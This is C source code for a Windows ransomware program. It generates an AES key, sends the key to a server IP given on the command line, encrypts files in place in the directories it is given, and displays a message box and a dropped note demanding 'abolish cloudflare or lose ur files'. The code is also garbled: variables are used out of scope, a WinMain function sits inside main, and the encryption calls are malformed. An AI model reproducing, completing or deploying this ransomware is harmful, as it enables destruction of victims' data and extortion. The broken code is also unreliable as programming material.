#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/aes.h>
#include <winsock2.h>
#include <shellapi.h>
#include <stdlib.h>

#define KEY_SIZE 32

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <server_ip> <dir1> [<dir2> ... <dirN>]\n", argv[0]);
        return 1;
    }

    char *server_ip = argv[1];
    int num_dirs = argc - 2;
    char **dir_paths = &argv[2];

    unsigned char key[KEY_SIZE];
    HCRYPTPROV hProv;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        printf("Error: could not acquire cryptographic context\n");
        return 1;
    }
    if (!CryptGenRandom(hProv, KEY_SIZE, key)) {
        printf("Error: could not generate random bytes\n");
        return 1;
    }
    CryptReleaseContext(hProv, 0);

    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server_addr;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Error: could not initialize Winsock\n");
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("Error: could not create socket\n");
        WSACleanup();
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(server_ip);
    server_addr.sin_port = htons(1234);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Error: could not connect to server\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    if (send(sock, key, KEY_SIZE, 0) != KEY_SIZE) {
        printf("Error: could not send key to server\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    closesocket(sock);
    WSACleanup();

    for (int i = 0; i < num_dirs; i++) {
        char *dir_path = dir_paths[i];
        DIR *dir = opendir(dir_path);
        if (!dir) {
            printf("Error: could not open directory %s\n", dir_path);
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_REG) {
                char file_path[1024];
                sprintf(file_path, "%s\\%s", dir_path, entry->d_name);

                FILE *file = fopen(file_path, "rb");
                if (!file) {
                    printf("Error: could not open file %s\n", file_path);
                    continue;
                }
            }

            fseek(file, 0, SEEK_END);
            long file_size = ftell(file);
            fseek(file, 0, SEEK_SET);

            unsigned char *file_content = malloc(file_size);
            fread(file_content, 1, file_size, file);
            fclose(file);

            AES_KEY aes_key;
            AES_set_encrypt_key(key, KEY_SIZE * 8, &aes_key);
            AES_encrypt(file_content, file_content, file_size, &aes_key);

            file = fopen(file_path, "wb");
            fwrite(file_content, 1, file_size, file);
            fclose(file);

            free(file_content);
          
    NOTIFYICONDATA nid = { sizeof(NOTIFYICONDATA) };
    nid.uFlags = NIF_ICON | NIF_TIP | NIF_INFO;
    nid.hIcon = LoadIcon(NULL, IDI_INFORMATION);
    strcpy(nid.szTip, "me so sad so sad :(");
    strcpy(nid.szInfo, "SHIIIITTTTT FUCKKKK FUCKK");
    nid.uTimeout = 7777;

    Shell_NotifyIcon(NIM_ADD, &nid);
    Shell_NotifyIcon(NIM_MODIFY, &nid);

          int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
              HWND hWnd = NULL;
              LPCSTR lpText = "abolish cloudflare or lose ur files!!!!";
              LPCSTR lpCaption = "https://github.com/kaosSec";
              UINT uType = MB_OK;
              
              MessageBox(hWnd, lpText, lpCaption, uType);
             FILE *fp;
             char str[] = "abolish cloudflare or lose ur files!!!! https://github.com/kaosSec";
          
             fp = fopen("MYFILES!!!!.KSS.txt", "w");
             fprintf(fp, "%s", str);
             fclose(fp);
             system("open MYFILES!!!!.KSS.txt");
          }
          
        }
    }

    closedir(dir);
